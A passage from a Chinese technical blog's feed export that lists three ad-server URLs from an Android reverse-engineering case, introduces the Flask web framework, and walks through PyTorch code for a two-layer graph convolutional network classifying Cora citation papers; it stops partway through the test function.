<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ad.pandanew.com:8511/search</span><br><span class="line">http://ad.phonego8:8511/search</span><br><span class="line">http://ad.my968.com:8511/search</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>案例分析</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask框架</title>
    <url>/2023/03/12/Flask%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="Flask框架"><a href="#Flask框架" class="headerlink" title="Flask框架"></a>Flask框架</h1><img src="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/image-20231224222753737.png" class title="image-20231224222753737">

<p>Flask框架诞生于2010年，是Armin ronacher用Python编写的轻量级Web应用程序框架，其本身相当于一个内核，几乎所有的功能都需要用到扩展工具，都需要第三方扩展来实现。</p>
<p>Flask框架的WSGI工具箱采用Werkzeug，模板引擎使用jinja2，其中：</p>
<ul>
<li><p>WSGI：Web服务器网关接口(WSGI)已被采纳为Python Web应用程序开发的标准，是Web服务器和Web应用程序之间通用接口的规范；</p>
</li>
<li><p>Werkzeug：是一个WSGI工具包，支持URL路由请求集成，一次可以响应多个用户的访问请求；支持Cookie和会话管理，提高用户访问速度；支持交互式Javascript调试，提高用户体验；可以处理HTTP基本事务，快速响应客户端推送过来的访问请求。</p>
</li>
<li><p>jinja2：是Python的流行模板引擎，网页模板系统将模板与特定的数据源结合起来呈现动态网页。</p>
</li>
</ul>
<h2 id="常用拓展包"><a href="#常用拓展包" class="headerlink" title="常用拓展包"></a>常用拓展包</h2><p>其常用的扩展工具有：</p>
<ul>
<li><p>Flask-script：脚本工具；</p>
</li>
<li><p>Flask-SQLalchemy：数据库操作工具；</p>
</li>
<li><p>Flask-migrate：管理迁移数据库工具；</p>
</li>
<li><p>Flask-Session：Session存储方式指定；</p>
</li>
<li><p>Flask-WTF：表单，WTForms的渲染和验证；</p>
</li>
<li><p>Flask-Mail：为Flask框架提供SMTP接口，邮件工具；</p>
</li>
<li><p>Flask-Bable：提供国际化和本地化支持，翻译；</p>
</li>
<li><p>Flask-Login：认证用户状态</p>
</li>
<li><p>Flask-OpenID：认证；</p>
</li>
<li><p>Flask-RESTful：开发REST API的工具；</p>
</li>
<li><p>Flask-Bootstrap：集成前端Twitter Bootstrap框架；</p>
</li>
<li><p>Flask-Moment：本地化日期和时间；</p>
</li>
<li><p>Flask-Admin：简单而可扩展的管理接口的框架。</p>
</li>
</ul>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>直接在pycharm中新建flask框架项目</p>
<img src="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/image-20231225102146349.png" class title="image-20231225102146349">

<p>新建后可以看到框架项目目录如下</p>
<img src="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/image-20231225102228639.png" class title="image-20231225102228639">

<ul>
<li>static：静态文件夹，里面通常存放js、css、img等一些静态文件；</li>
<li>templates：模板文件夹，用来保存我们html模板；</li>
<li>venv：虚拟环境文件夹，存放我们pip安装的库、模块和扩展工具等；</li>
<li>app.py：项目启动文件</li>
</ul>
<p>app.py文件如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="comment">#创建Flask实例对象</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#装饰器触发视图函数URL</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="comment">#定义视图函数，返回浏览器中显示信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span>  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello Everyone!This is the first flask project&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"><span class="comment">#app.run()启动服务器</span></span><br></pre></td></tr></table></figure>

<p>运行该文件，如下</p>
<img src="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/image-20231225102554380.png" class title="image-20231225102554380">

<p>访问5000端口，浏览器返回定义的视图函数中的显示信息</p>
<img src="/2023/03/12/Flask%E6%A1%86%E6%9E%B6/image-20231225102750022.png" class title="image-20231225102750022">]]></content>
      <categories>
        <category>内功心法</category>
        <category>框架</category>
      </categories>
      <tags>
        <tag>-python框架 -Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>GCN之实现论文分类</title>
    <url>/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="GCN之实现论文分类"><a href="#GCN之实现论文分类" class="headerlink" title="GCN之实现论文分类"></a>GCN之实现论文分类</h1><p>本次实验的目的是将论文进行分类。提供GCN模型训练，利用已经分好类的训练集将论文分为7类</p>
<h2 id="数据集介绍"><a href="#数据集介绍" class="headerlink" title="数据集介绍"></a>数据集介绍</h2><p>选用的是GCN常用的Cora数据集，实验的目标就是通过对构造出来的两层GCN模型进行训练，实现对数据集样本节点的分类</p>
<p>Cora数据集由关于机器学习方面的论文组成。 这些论文分为以下七个类别之一：</p>
<p>1.基于案例</p>
<p>2.遗传算法</p>
<p>3.神经网络</p>
<p>4.概率方法</p>
<p>5.强化学习</p>
<p>6.规则学习</p>
<p>7.理论</p>
<p>这些论文都是经过筛选的，在最终的数据集中，每篇论文引用或被至少一篇其他论文引用。整个语料库中有2708篇论文。在词干堵塞和去除词尾后，只剩下1433个唯一的单词。文档频率小于10的所有单词都被删除。即Cora数据集包含2708个顶点, 5429条边,每个顶点包含1433个特征，共有7个类别。</p>
<p>并且Cora已经把训练集和测试集的数据都划分好了，直接按照文件名读取数据即可，如文件ind.cora.x &#x3D;&gt; 训练实例的特征向量；ind.cora.y &#x3D;&gt; 训练实例的标签，独热编码; ind.cora.tx &#x3D;&gt; 测试实例的特征向量；ind.cora.ty &#x3D;&gt; 测试实例的标签，独热编码</p>
<h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p>定义了一个无向图$G(V,E)$,V顶点代表论文，任意两个顶点之间的边代表引用关系。首先通过使用NLP嵌入将论文节点转换为向量，获取所有邻居节点以及自身的特征向量然后使用神经网络返回结果向量。</p>
<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231123220133997.png" class title="image-20231123220133997">

<p>两层GCN的例子如下：</p>
<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231123220203281.png" class title="image-20231123220203281">

<p>那么两层的GCN就可以在降维的同时，通过层间传播的公式获取到二阶邻居节点的特征：</p>
<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231123220342839.png" class title="image-20231123220342839">

<p>在节点分类问题中，输入的邻接矩阵和每个节点的特征中，包含了节点自身以及各节点的特征，通过GCN的卷积层实现降维，聚成几类就降成几维</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path <span class="keyword">as</span> osp</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.sparse <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.nn.init <span class="keyword">as</span> init</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br></pre></td></tr></table></figure>

<h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Data = namedtuple(<span class="string">&#x27;Data&#x27;</span>, [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;adjacency&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;train_mask&#x27;</span>, <span class="string">&#x27;val_mask&#x27;</span>, <span class="string">&#x27;test_mask&#x27;</span>])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tensor_from_numpy</span>(<span class="params">x, device</span>):</span></span><br><span class="line">    <span class="keyword">return</span> torch.from_numpy(x).to(device)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CoraData</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    filenames = [<span class="string">&quot;ind.cora.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(name) <span class="keyword">for</span> name <span class="keyword">in</span></span><br><span class="line">                 [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;tx&#x27;</span>, <span class="string">&#x27;allx&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;ty&#x27;</span>, <span class="string">&#x27;ally&#x27;</span>, <span class="string">&#x27;graph&#x27;</span>, <span class="string">&#x27;test.index&#x27;</span>]] <span class="comment">#训练集和测试集文件名</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data_root=<span class="string">&quot;data&quot;</span>, rebuild=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Cora数据，包括数据下载，处理，加载等功能</span></span><br><span class="line"><span class="string">        当数据的缓存文件存在时，将使用缓存文件，否则将下载、进行处理，并缓存到磁盘</span></span><br><span class="line"><span class="string">        处理之后的数据可以通过属性 .data 获得，它将返回一个数据对象，包括如下几部分：</span></span><br><span class="line"><span class="string">            * x: 节点的特征，维度为 2708 * 1433，类型为 np.ndarray</span></span><br><span class="line"><span class="string">            * y: 节点的标签，总共包括7个类别，类型为 np.ndarray</span></span><br><span class="line"><span class="string">            * adjacency: 邻接矩阵，维度为 2708 * 2708，类型为 scipy.sparse.coo.coo_matrix</span></span><br><span class="line"><span class="string">            * train_mask: 训练集掩码向量，维度为 2708，当节点属于训练集时，相应位置为True，否则False</span></span><br><span class="line"><span class="string">            * val_mask: 验证集掩码向量，维度为 2708，当节点属于验证集时，相应位置为True，否则False</span></span><br><span class="line"><span class="string">            * test_mask: 测试集掩码向量，维度为 2708，当节点属于测试集时，相应位置为True，否则False</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">        -------</span></span><br><span class="line"><span class="string">            data_root: string, optional</span></span><br><span class="line"><span class="string">                存放数据的目录，原始数据路径: ../data/cora</span></span><br><span class="line"><span class="string">                缓存数据路径: &#123;data_root&#125;/ch5_cached.pkl</span></span><br><span class="line"><span class="string">            rebuild: boolean, optional</span></span><br><span class="line"><span class="string">                是否需要重新构建数据集，当设为True时，如果存在缓存数据也会重建数据</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.data_root = data_root <span class="comment">#数据存放的路径</span></span><br><span class="line">        save_file = osp.join(self.data_root, <span class="string">&quot;ch5_cached.pkl&quot;</span>)<span class="comment">#缓存文件路径</span></span><br><span class="line">        <span class="keyword">if</span> osp.exists(save_file) <span class="keyword">and</span> <span class="keyword">not</span> rebuild:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Using Cached file: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(save_file))</span><br><span class="line">            self._data = pickle.load(<span class="built_in">open</span>(save_file, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._data = self.process_data()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(save_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                pickle.dump(self.data, f)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Cached file: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(save_file))</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">data</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回Data数据对象，包括x, y, adjacency, train_mask, val_mask, test_mask&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self._data</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_data</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理数据，得到节点特征和标签，邻接矩阵，训练集、验证集以及测试集</span></span><br><span class="line"><span class="string">        引用自：https://github.com/rusty1s/pytorch_geometric</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Process data ...&quot;</span>)</span><br><span class="line">        _, tx, allx, y, ty, ally, graph, test_index = [self.read_data(</span><br><span class="line">            osp.join(self.data_root, name)) <span class="keyword">for</span> name <span class="keyword">in</span> self.filenames]</span><br><span class="line">        train_index = np.arange(y.shape[<span class="number">0</span>])</span><br><span class="line">        val_index = np.arange(y.shape[<span class="number">0</span>], y.shape[<span class="number">0</span>] + <span class="number">500</span>)</span><br><span class="line">        sorted_test_index = <span class="built_in">sorted</span>(test_index)</span><br><span class="line"> </span><br><span class="line">        x = np.concatenate((allx, tx), axis=<span class="number">0</span>)                <span class="comment">#节点特征</span></span><br><span class="line">        y = np.concatenate((ally, ty), axis=<span class="number">0</span>).argmax(axis=<span class="number">1</span>) <span class="comment">#标签</span></span><br><span class="line"> </span><br><span class="line">        x[test_index] = x[sorted_test_index]</span><br><span class="line">        y[test_index] = y[sorted_test_index]</span><br><span class="line">        num_nodes = x.shape[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">        train_mask = np.zeros(num_nodes, dtype=np.<span class="built_in">bool</span>) <span class="comment">#训练集</span></span><br><span class="line">        val_mask = np.zeros(num_nodes, dtype=np.<span class="built_in">bool</span>)   <span class="comment">#验证集</span></span><br><span class="line">        test_mask = np.zeros(num_nodes, dtype=np.<span class="built_in">bool</span>)  <span class="comment">#测试集</span></span><br><span class="line">        train_mask[train_index] = <span class="literal">True</span></span><br><span class="line">        val_mask[val_index] = <span class="literal">True</span></span><br><span class="line">        test_mask[test_index] = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="string">&quot;&quot;&quot;&quot;构建邻接矩阵&quot;&quot;&quot;</span></span><br><span class="line">        adjacency = self.build_adjacency(graph)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Node&#x27;s feature shape: &quot;</span>, x.shape)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Node&#x27;s label shape: &quot;</span>, y.shape)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Adjacency&#x27;s shape: &quot;</span>, adjacency.shape)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Number of training nodes: &quot;</span>, train_mask.<span class="built_in">sum</span>())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Number of validation nodes: &quot;</span>, val_mask.<span class="built_in">sum</span>())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Number of test nodes: &quot;</span>, test_mask.<span class="built_in">sum</span>())</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> Data(x=x, y=y, adjacency=adjacency,</span><br><span class="line">                    train_mask=train_mask, val_mask=val_mask, test_mask=test_mask)</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_adjacency</span>(<span class="params">adj_dict</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据邻接表创建邻接矩阵&quot;&quot;&quot;</span></span><br><span class="line">        edge_index = []</span><br><span class="line">        num_nodes = <span class="built_in">len</span>(adj_dict)</span><br><span class="line">        <span class="keyword">for</span> src, dst <span class="keyword">in</span> adj_dict.items():</span><br><span class="line">            edge_index.extend([src, v] <span class="keyword">for</span> v <span class="keyword">in</span> dst)</span><br><span class="line">            edge_index.extend([v, src] <span class="keyword">for</span> v <span class="keyword">in</span> dst)</span><br><span class="line">        <span class="comment"># 去除重复的边</span></span><br><span class="line">        edge_index = <span class="built_in">list</span>(k <span class="keyword">for</span> k, _ <span class="keyword">in</span> itertools.groupby(<span class="built_in">sorted</span>(edge_index)))</span><br><span class="line">        edge_index = np.asarray(edge_index)</span><br><span class="line">        adjacency = sp.coo_matrix((np.ones(<span class="built_in">len</span>(edge_index)), </span><br><span class="line">                                   (edge_index[:, <span class="number">0</span>], edge_index[:, <span class="number">1</span>])),</span><br><span class="line">                    shape=(num_nodes, num_nodes), dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> adjacency</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_data</span>(<span class="params">path</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;使用不同的方式读取原始数据以进一步处理&quot;&quot;&quot;</span></span><br><span class="line">        name = osp.basename(path)</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&quot;ind.cora.test.index&quot;</span>:</span><br><span class="line">            out = np.genfromtxt(path, dtype=<span class="string">&quot;int64&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> out</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out = pickle.load(<span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>), encoding=<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line">            out = out.toarray() <span class="keyword">if</span> <span class="built_in">hasattr</span>(out, <span class="string">&quot;toarray&quot;</span>) <span class="keyword">else</span> out</span><br><span class="line">            <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">normalization</span>(<span class="params">adjacency</span>):</span>  <span class="comment">#zeng</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;计算 H=D^-0.5 * (A+I) * D^-0.5&quot;&quot;&quot;</span></span><br><span class="line">        adjacency += sp.eye(adjacency.shape[<span class="number">0</span>])    <span class="comment"># 增加自连接</span></span><br><span class="line">        degree = np.array(adjacency.<span class="built_in">sum</span>(<span class="number">1</span>))</span><br><span class="line">        d_hat = sp.diags(np.power(degree, -<span class="number">0.5</span>).flatten())</span><br><span class="line">        <span class="keyword">return</span> d_hat.dot(adjacency).dot(d_hat).tocoo()</span><br></pre></td></tr></table></figure>

<h3 id="图卷积层准备"><a href="#图卷积层准备" class="headerlink" title="图卷积层准备"></a>图卷积层准备</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GraphConvolution</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_dim, output_dim, use_bias=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;图卷积：H*X*\theta</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">        ----------</span></span><br><span class="line"><span class="string">            input_dim: int</span></span><br><span class="line"><span class="string">                节点输入特征的维度</span></span><br><span class="line"><span class="string">            output_dim: int</span></span><br><span class="line"><span class="string">                输出特征维度</span></span><br><span class="line"><span class="string">            use_bias : bool, optional</span></span><br><span class="line"><span class="string">                是否使用偏置</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(GraphConvolution, self).__init__()</span><br><span class="line">        self.input_dim = input_dim</span><br><span class="line">        self.output_dim = output_dim</span><br><span class="line">        self.use_bias = use_bias</span><br><span class="line">        self.weight = nn.Parameter(torch.Tensor(input_dim, output_dim))<span class="comment">#将Tensor类型转换为可训练的parametercan&#x27;shu</span></span><br><span class="line">        <span class="keyword">if</span> self.use_bias:</span><br><span class="line">            self.bias = nn.Parameter(torch.Tensor(output_dim))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.register_parameter(<span class="string">&#x27;bias&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.reset_parameters() <span class="comment">#初始化w</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_parameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        init.kaiming_uniform_(self.weight) </span><br><span class="line">        <span class="comment">#init.kaiming_uniform_神经网络权重初始化，神经网络要优化一个非常复杂的非线性模型，而且基本没有全局最优解，</span></span><br><span class="line">        <span class="comment">#初始化在其中扮演着非常重要的作用，尤其在没有BN等技术的早期，它直接影响模型能否收敛。</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.use_bias:</span><br><span class="line">            init.zeros_(self.bias)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, adjacency, input_feature</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;邻接矩阵是稀疏矩阵，因此在计算时使用稀疏矩阵乘法</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        Args: </span></span><br><span class="line"><span class="string">        -------</span></span><br><span class="line"><span class="string">            adjacency: torch.sparse.FloatTensor</span></span><br><span class="line"><span class="string">                邻接矩阵</span></span><br><span class="line"><span class="string">            input_feature: torch.Tensor</span></span><br><span class="line"><span class="string">                输入特征</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        support = torch.mm(input_feature, self.weight)</span><br><span class="line">        output = torch.sparse.mm(adjacency, support)</span><br><span class="line">        <span class="keyword">if</span> self.use_bias:</span><br><span class="line">            output += self.bias</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.__class__.__name__ + <span class="string">&#x27; (&#x27;</span> \</span><br><span class="line">            + <span class="built_in">str</span>(self.input_dim) + <span class="string">&#x27; -&gt; &#x27;</span> \</span><br><span class="line">            + <span class="built_in">str</span>(self.output_dim) + <span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="GCN模型定义"><a href="#GCN模型定义" class="headerlink" title="GCN模型定义"></a>GCN模型定义</h3><p>定义一个两层的GCN卷积模型，其中输入的维度为1433，隐藏层维度设为16，最后一层GCN将输出维度变为类别数7，激活函数使用的是ReLU。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class GcnNet(nn.Module):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    定义一个包含两层GraphConvolution的模型</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def __init__(self, input_dim=1433):</span><br><span class="line">        super(GcnNet, self).__init__()</span><br><span class="line">        self.gcn1 = GraphConvolution(input_dim, 16)</span><br><span class="line">        self.gcn2 = GraphConvolution(16, 7)</span><br><span class="line">    </span><br><span class="line">    def forward(self, adjacency, feature):</span><br><span class="line">        h = F.relu(self.gcn1(adjacency, feature))</span><br><span class="line">        logits = self.gcn2(adjacency, h)</span><br><span class="line">        return logits</span><br></pre></td></tr></table></figure>

<h3 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h3><p><strong>超参数定义</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LEARNING_RATE = <span class="number">0.1</span> <span class="comment">#学习率 学习率过小→ →→收敛过慢，学习率过大→ →→错过局部最优；</span></span><br><span class="line">WEIGHT_DACAY = <span class="number">5e-4</span> <span class="comment">#正则化系数 weight_dacay，解决过拟合问题</span></span><br><span class="line">EPOCHS = <span class="number">200</span>        <span class="comment">#完整遍历训练集的次数</span></span><br><span class="line">DEVICE = <span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span> <span class="comment">#指定设备，如果当前显卡忙于其他工作，可以设置为 DEVICE = &quot;cpu&quot;，使用cpu运行</span></span><br></pre></td></tr></table></figure>

<p>由于最开始不知道边的权重，需要通过模型训练出来合适的权重，即W</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加载数据，并转换为torch.Tensor</span></span><br><span class="line">dataset = CoraData().data</span><br><span class="line">node_feature = dataset.x / dataset.x.<span class="built_in">sum</span>(<span class="number">1</span>, keepdims=<span class="literal">True</span>)  <span class="comment"># 归一化数据，使得每一行和为1</span></span><br><span class="line">tensor_x = tensor_from_numpy(node_feature, DEVICE)</span><br><span class="line">tensor_y = tensor_from_numpy(dataset.y, DEVICE)</span><br><span class="line">tensor_train_mask = tensor_from_numpy(dataset.train_mask, DEVICE)</span><br><span class="line">tensor_val_mask = tensor_from_numpy(dataset.val_mask, DEVICE)</span><br><span class="line">tensor_test_mask = tensor_from_numpy(dataset.test_mask, DEVICE)</span><br><span class="line">normalize_adjacency = CoraData.normalization(dataset.adjacency)   <span class="comment"># 规范化邻接矩阵</span></span><br><span class="line"> </span><br><span class="line">num_nodes, input_dim = node_feature.shape</span><br><span class="line">indices = torch.from_numpy(np.asarray([normalize_adjacency.row, </span><br><span class="line">                                       normalize_adjacency.col]).astype(<span class="string">&#x27;int64&#x27;</span>)).long()</span><br><span class="line">values = torch.from_numpy(normalize_adjacency.data.astype(np.float32))</span><br><span class="line">tensor_adjacency = torch.sparse.FloatTensor(indices, values, </span><br><span class="line">                                            (num_nodes, num_nodes)).to(DEVICE)</span><br></pre></td></tr></table></figure>

<p><strong>定义模型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 模型定义：Model, Loss, Optimizer</span><br><span class="line">model = GcnNet(input_dim).to(DEVICE)</span><br><span class="line">criterion = nn.CrossEntropyLoss().to(DEVICE) #nn.CrossEntropyLoss()函数计算交叉熵损失</span><br><span class="line">optimizer = optim.Adam(model.parameters(), </span><br><span class="line">                       lr=LEARNING_RATE, </span><br><span class="line">                       weight_decay=WEIGHT_DACAY)</span><br></pre></td></tr></table></figure>

<p>在训练过程中通过nn.CrossEntropyLoss()函数计算交叉熵损失</p>
<img src="/2024/01/17/GCN%E4%B9%8B%E5%AE%9E%E7%8E%B0%E8%AE%BA%E6%96%87%E5%88%86%E7%B1%BB/image-20231124154100838.png" class title="image-20231124154100838">

<p><strong>定义训练和测试函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 训练主体函数</span><br><span class="line">def train():</span><br><span class="line">    loss_history = []</span><br><span class="line">    val_acc_history = []</span><br><span class="line">    model.train()</span><br><span class="line">    train_y = tensor_y[tensor_train_mask]</span><br><span class="line">    </span><br><span class="line">    for epoch in range(EPOCHS):</span><br><span class="line">        # 共进行200次训练</span><br><span class="line">        logits = model(tensor_adjacency, tensor_x)  # 前向传播</span><br><span class="line">        #其中logits是模型输出，tensor_adjacency, tensor_x分别是邻接矩阵和节点特征。</span><br><span class="line">        </span><br><span class="line">        train_mask_logits = logits[tensor_train_mask]   # 只选择训练节点进行监督</span><br><span class="line">        loss = criterion(train_mask_logits, train_y)    # 计算损失值，目的是优化模型，获得更科学的权重W</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()     # 反向传播计算参数的梯度</span><br><span class="line">        optimizer.step()    # 使用优化方法进行梯度更新</span><br><span class="line">        train_acc, _, _ = test(tensor_train_mask)     # 计算当前模型训练集上的准确率</span><br><span class="line">        val_acc, _, _ = test(tensor_val_mask)     # 计算当前模型在验证集上的准确率</span><br><span class="line">        </span><br><span class="line">        # 记录训练过程中损失值和准确率的变化，用于画图</span><br><span class="line">        loss_history.append(loss.item())</span><br><span class="line">        val_acc_history.append(val_acc.item())</span><br><span class="line">        print(&quot;Epoch &#123;:03d&#125;: Loss &#123;:.4f&#125;, TrainAcc &#123;:.4&#125;, ValAcc &#123;:.4f&#125;&quot;.format(</span><br><span class="line">            epoch, loss.item(), train_acc.item(), val_acc.item()))</span><br><span class="line">    </span><br><span class="line">    return loss_history, val_acc_history</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 测试函数</span><br><span class="line">def test(mask):</span><br><span class="line">    model.eval()  # 